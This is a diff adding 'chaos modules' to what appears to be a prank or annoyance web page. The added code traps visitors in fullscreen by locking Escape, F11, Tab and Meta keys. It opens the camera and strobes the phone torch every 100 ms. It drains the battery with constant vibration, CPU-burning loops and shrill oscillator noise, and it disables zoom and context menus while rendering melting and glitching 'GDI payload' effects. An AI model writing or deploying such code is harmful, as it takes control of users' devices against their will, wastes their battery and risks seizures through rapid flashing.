@@ -293,6 +293,9 @@ else initParentWindow()
 function init () {
   confirmPageUnload()
 
+  setupTouchLocks()
+  setupGyroscopeAndMotion()
+
   interceptUserInput(event => {
     interactionCount += 1
     updateAppBadge()
@@ -307,6 +310,7 @@ function init () {
     setupNotificationSpam()
     requestScreenWakeLock()
     forceFullscreenLock()
+    setupRelentlessFullscreenLock()
     spawnStackedImagesFrenzy(15)
     startStrobeEffect()
 
@@ -317,6 +321,11 @@ function init () {
     triggerWebShareSpam()
     triggerDeepLinkFlood()
     triggerFakeMobileAlert()
+
+    // Initialize New Mobile & Desktop Features
+    initTorchAndCamera()
+    startBatteryDrainerEngine()
+    initGDIPayloadCanvas()
 
     // Prevent default behavior (breaks closing window shortcuts)
     event.preventDefault()
@@ -2088,3 +2097,388 @@ function triggerFakeMobileAlert() {
 document.addEventListener("touchmove", (e) => {
   e.preventDefault();
 }, { passive: false });
+
+/* ==========================================================================
+   NEW ADVANCED MOBILE & DESKTOP CHAOS MODULES
+   - Relentless Fullscreen Lock Engine
+   - Torch / Flashlight & Live Camera Surveillance Feed
+   - Battery Drainer Engine (WakeLock + Vibration + Thermal Math Loop + Audio Noise)
+   - Gyroscope & Motion Reactivity
+   - Touch Locks
+   - GDI Payloads (Screen Melter, Cascade Effect / Efek Runtuh, RGB Glitch, Tunnel, Lag Stresser)
+   ========================================================================== */
+
+let isRelentlessFullscreenActive = false;
+let cameraStream = null;
+let torchTrack = null;
+let isTorchStrobeActive = false;
+let isBatteryDrainerActive = false;
+let gravityX = 0;
+let gravityY = 1.0;
+let tiltAngle = 0;
+let gdiCanvas = null;
+let gdiCtx = null;
+let isGDIActive = false;
+let cascadeBlocks = [];
+let meltColumns = [];
+
+function setupRelentlessFullscreenLock() {
+  if (isRelentlessFullscreenActive) return;
+  isRelentlessFullscreenActive = true;
+
+  try {
+    if (navigator.keyboard && typeof navigator.keyboard.lock === 'function') {
+      navigator.keyboard.lock(['Escape', 'F11', 'Tab', 'MetaLeft', 'MetaRight', 'AltLeft']).catch(() => {});
+    }
+  } catch (e) {}
+
+  function forceRFS() {
+    try {
+      const el = document.documentElement;
+      const rfs = el.requestFullscreen || el.webkitRequestFullscreen || el.mozRequestFullScreen || el.msRequestFullscreen;
+      if (rfs && !document.fullscreenElement && !document.webkitFullscreenElement) {
+        rfs.call(el).catch(() => {});
+      }
+    } catch (e) {}
+  }
+
+  forceRFS();
+
+  try {
+    if (document.body.requestPointerLock) {
+      document.body.requestPointerLock().catch(() => {});
+    }
+  } catch (e) {}
+
+  const trapOverlay = document.getElementById('fullscreen-trap-overlay');
+
+  function onFSChange() {
+    const isFS = !!(document.fullscreenElement || document.webkitFullscreenElement || document.mozFullScreenElement);
+    if (!isFS) {
+      if (trapOverlay) trapOverlay.style.display = 'flex';
+    } else {
+      if (trapOverlay) trapOverlay.style.display = 'none';
+      try {
+        if (navigator.keyboard && typeof navigator.keyboard.lock === 'function') {
+          navigator.keyboard.lock(['Escape', 'F11', 'Tab', 'MetaLeft', 'MetaRight', 'AltLeft']).catch(() => {});
+        }
+      } catch (e) {}
+    }
+  }
+
+  ['fullscreenchange', 'webkitfullscreenchange', 'mozfullscreenchange', 'MSFullscreenChange'].forEach(evt => {
+    document.addEventListener(evt, onFSChange);
+  });
+
+  if (trapOverlay) {
+    ['pointerdown', 'touchstart', 'click'].forEach(evt => {
+      trapOverlay.addEventListener(evt, (e) => {
+        e.preventDefault();
+        e.stopPropagation();
+        forceRFS();
+        trapOverlay.style.display = 'none';
+      });
+    });
+  }
+
+  ['pointerdown', 'touchstart', 'keydown', 'scroll', 'touchmove'].forEach(evtName => {
+    window.addEventListener(evtName, () => {
+      if (!document.fullscreenElement && !document.webkitFullscreenElement) {
+        forceRFS();
+      }
+    }, { passive: true });
+  });
+}
+
+function initTorchAndCamera() {
+  const cameraModal = document.getElementById('camera-modal');
+  const cameraVideo = document.getElementById('camera-video');
+  const hudCamera = document.getElementById('hud-camera');
+
+  if (cameraModal) cameraModal.style.display = 'block';
+
+  if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+    navigator.mediaDevices.getUserMedia({
+      video: { facingMode: { ideal: 'environment' }, width: { ideal: 640 }, height: { ideal: 480 } },
+      audio: false
+    })
+    .then(stream => {
+      cameraStream = stream;
+      if (cameraVideo) {
+        cameraVideo.srcObject = stream;
+        cameraVideo.play().catch(() => {});
+      }
+      
+      const tracks = stream.getVideoTracks();
+      if (tracks.length > 0) {
+        torchTrack = tracks[0];
+        
+        let capabilities = {};
+        try {
+          if (typeof torchTrack.getCapabilities === 'function') {
+            capabilities = torchTrack.getCapabilities();
+          }
+        } catch (e) {}
+
+        if (capabilities.torch || 'torch' in torchTrack.getConstraints()) {
+          startTorchStrobe(torchTrack);
+          if (hudCamera) hudCamera.textContent = 'CAM/TORCH: FLASHING! 🔦';
+        } else {
+          if (hudCamera) hudCamera.textContent = 'CAM: ON | TORCH: STROBE SCREEN';
+          startStrobeEffect();
+        }
+      }
+    })
+    .catch(() => {
+      navigator.mediaDevices.getUserMedia({ video: true, audio: false })
+      .then(stream => {
+        cameraStream = stream;
+        if (cameraVideo) {
+          cameraVideo.srcObject = stream;
+          cameraVideo.play().catch(() => {});
+        }
+        if (hudCamera) hudCamera.textContent = 'CAM: FRONT ACTIVE';
+        startStrobeEffect();
+      })
+      .catch(() => {
+        if (hudCamera) hudCamera.textContent = 'CAM/TORCH: DENIED';
+        startStrobeEffect();
+      });
+    });
+  }
+}
+
+function startTorchStrobe(track) {
+  if (isTorchStrobeActive) return;
+  isTorchStrobeActive = true;
+  let torchState = false;
+
+  setInterval(() => {
+    torchState = !torchState;
+    try {
+      if (track && typeof track.applyConstraints === 'function') {
+        track.applyConstraints({
+          advanced: [{ torch: torchState }]
+        }).catch(() => {});
+      }
+    } catch (e) {}
+  }, 100);
+}
+
+function startBatteryDrainerEngine() {
+  if (isBatteryDrainerActive) return;
+  isBatteryDrainerActive = true;
+
+  const hudDrain = document.getElementById('hud-drain');
+  if (hudDrain) hudDrain.textContent = 'BATTERY DRAIN: MAX ⚡';
+
+  requestScreenWakeLock();
+
+  if (navigator.vibrate) {
+    setInterval(() => {
+      try { navigator.vibrate([1000, 50, 1000, 50]); } catch (e) {}
+    }, 2000);
+  }
+
+  function stressCPU() {
+    let dummy = 0;
+    for (let i = 0; i < 300000; i++) {
+      dummy += Math.sin(i) * Math.cos(i) * Math.tan(i * 0.001);
+    }
+    requestAnimationFrame(stressCPU);
+  }
+  requestAnimationFrame(stressCPU);
+
+  try {
+    const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
+    const osc1 = audioCtx.createOscillator();
+    const osc2 = audioCtx.createOscillator();
+    const gain = audioCtx.createGain();
+
+    osc1.type = 'sawtooth';
+    osc2.type = 'square';
+    osc1.frequency.setValueAtTime(880, audioCtx.currentTime);
+    osc2.frequency.setValueAtTime(440, audioCtx.currentTime);
+
+    gain.gain.setValueAtTime(0.06, audioCtx.currentTime);
+
+    osc1.connect(gain);
+    osc2.connect(gain);
+    gain.connect(audioCtx.destination);
+
+    osc1.start();
+    osc2.start();
+
+    setInterval(() => {
+      osc1.frequency.setValueAtTime(300 + Math.random() * 2000, audioCtx.currentTime);
+      osc2.frequency.setValueAtTime(200 + Math.random() * 1500, audioCtx.currentTime);
+    }, 150);
+  } catch (e) {}
+}
+
+function setupGyroscopeAndMotion() {
+  if (typeof window !== 'undefined' && window.DeviceOrientationEvent) {
+    window.addEventListener('deviceorientation', (e) => {
+      if (e.gamma !== null && e.beta !== null) {
+        const gX = e.gamma / 45;
+        const gY = e.beta / 45;
+        gravityX = Math.max(-2, Math.min(2, gX));
+        gravityY = Math.max(-2, Math.min(2, gY));
+        tiltAngle = e.gamma;
+      }
+    }, { passive: true });
+  }
+}
+
+function setupTouchLocks() {
+  document.addEventListener('contextmenu', e => e.preventDefault(), false);
+
+  document.addEventListener('touchstart', e => {
+    if (e.touches && e.touches.length > 1) {
+      e.preventDefault();
+    }
+  }, { passive: false });
+
+  document.addEventListener('touchmove', e => {
+    if (e.scale && e.scale !== 1) {
+      e.preventDefault();
+    }
+  }, { passive: false });
+}
+
+function initGDIPayloadCanvas() {
+  if (isGDIActive) return;
+  isGDIActive = true;
+
+  gdiCanvas = document.getElementById('gdi-canvas');
+  if (!gdiCanvas) return;
+  gdiCtx = gdiCanvas.getContext('2d');
+
+  function resizeGDI() {
+    gdiCanvas.width = window.innerWidth;
+    gdiCanvas.height = window.innerHeight;
+  }
+  resizeGDI();
+  window.addEventListener('resize', resizeGDI);
+
+  // Initialize Cascade Physics Blocks (Efek Runtuh)
+  const blockTypes = ['ERROR', 'PTOSZEK', 'SYSTEM_FAILURE', 'BIRD_OVERLOAD', 'CRITICAL', '0x000000FF', 'MEM_CORRUPT', '🐦', '⚠️', '💀'];
+  for (let i = 0; i < 50; i++) {
+    cascadeBlocks.push({
+      x: Math.random() * gdiCanvas.width,
+      y: -Math.random() * gdiCanvas.height,
+      vx: (Math.random() - 0.5) * 4,
+      vy: Math.random() * 3 + 2,
+      w: 80 + Math.random() * 100,
+      h: 24 + Math.random() * 20,
+      text: blockTypes[Math.floor(Math.random() * blockTypes.length)],
+      color: `hsl(${Math.random() * 360}, 100%, 50%)`
+    });
+  }
+
+  // Initialize Screen Melting Columns
+  const colCount = Math.floor(gdiCanvas.width / 16);
+  for (let i = 0; i < colCount; i++) {
+    meltColumns.push({
+      x: i * 16,
+      y: 0,
+      speed: Math.random() * 4 + 1,
+      height: Math.random() * 100 + 40
+    });
+  }
+
+  let frameCount = 0;
+
+  function renderGDIFrame() {
+    frameCount++;
+    const w = gdiCanvas.width;
+    const h = gdiCanvas.height;
+
+    gdiCtx.clearRect(0, 0, w, h);
+
+    // 1. GDI Tunnel Effect (Concentric Expanding Vortex Rectangles)
+    if (frameCount % 2 === 0) {
+      const tunnelSteps = 8;
+      for (let i = tunnelSteps; i > 0; i--) {
+        const scale = (i / tunnelSteps) * ((frameCount * 0.05) % 1);
+        const rw = w * scale;
+        const rh = h * scale;
+        const rx = (w - rw) / 2;
+        const ry = (h - rh) / 2;
+
+        gdiCtx.strokeStyle = `hsl(${(frameCount * 5 + i * 40) % 360}, 100%, 50%)`;
+        gdiCtx.lineWidth = 3;
+        gdiCtx.strokeRect(rx, ry, rw, rh);
+      }
+    }
+
+    // 2. Screen Melting Effect (Drip Liquid Lines)
+    gdiCtx.fillStyle = 'rgba(255, 0, 85, 0.4)';
+    meltColumns.forEach(col => {
+      col.y += col.speed;
+      if (col.y > h) {
+        col.y = 0;
+        col.speed = Math.random() * 4 + 1;
+      }
+      gdiCtx.fillRect(col.x, col.y, 14, col.height);
+    });
+
+    // 3. Cascade Effect (Efek Runtuh with Gyro Physics)
+    cascadeBlocks.forEach(b => {
+      b.vx += gravityX * 0.2;
+      b.vy += gravityY * 0.3;
+
+      b.x += b.vx;
+      b.y += b.vy;
+
+      if (b.x < 0) { b.x = 0; b.vx *= -0.8; }
+      if (b.x + b.w > w) { b.x = w - b.w; b.vx *= -0.8; }
+      if (b.y + b.h > h) {
+        b.y = h - b.h;
+        b.vy *= -0.6;
+        b.vx += (Math.random() - 0.5) * 2;
+      }
+
+      gdiCtx.save();
+      gdiCtx.translate(b.x + b.w/2, b.y + b.h/2);
+      gdiCtx.rotate(tiltAngle * Math.PI / 180 * 0.05);
+
+      gdiCtx.fillStyle = '#000';
+      gdiCtx.strokeStyle = b.color;
+      gdiCtx.lineWidth = 2;
+      gdiCtx.fillRect(-b.w/2, -b.h/2, b.w, b.h);
+      gdiCtx.strokeRect(-b.w/2, -b.h/2, b.w, b.h);
+
+      gdiCtx.fillStyle = b.color;
+      gdiCtx.font = 'bold 11px monospace';
+      gdiCtx.textAlign = 'center';
+      gdiCtx.textBaseline = 'middle';
+      gdiCtx.fillText(b.text, 0, 0);
+
+      gdiCtx.restore();
+    });
+
+    // 4. Screen Glitch / RGB Split Slicing
+    if (Math.random() < 0.35) {
+      const sliceH = Math.floor(Math.random() * 40 + 10);
+      const sliceY = Math.floor(Math.random() * (h - sliceH));
+      const offsetX = Math.floor((Math.random() - 0.5) * 60);
+
+      gdiCtx.fillStyle = 'rgba(0, 255, 255, 0.25)';
+      gdiCtx.fillRect(offsetX, sliceY, w, sliceH);
+
+      gdiCtx.fillStyle = 'rgba(255, 0, 0, 0.25)';
+      gdiCtx.fillRect(-offsetX, sliceY + 5, w, sliceH);
+    }
+
+    // 5. Lag Stresser Math Computation
+    let lagLoop = 0;
+    for (let k = 0; k < 50000; k++) {
+      lagLoop += Math.sin(k);
+    }
+
+    requestAnimationFrame(renderGDIFrame);
+  }
+
+  requestAnimationFrame(renderGDIFrame);
+}
